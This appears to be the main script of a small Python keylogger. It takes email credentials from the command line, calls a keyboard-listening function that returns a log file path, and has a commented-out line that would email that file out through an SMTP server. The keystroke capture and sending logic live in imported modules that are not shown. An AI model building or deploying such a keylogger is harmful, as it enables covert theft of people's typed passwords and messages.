from src.events.email_events import send_email
from src.events.keyboard_events import listen_keyboard
from src.static.constants import SMTP_SERVERS
import sys

service, email, password = sys.argv[1:]

filepath = listen_keyboard()

# giving issues
# send_email(SMTP_SERVERS[service], email, password, filepath)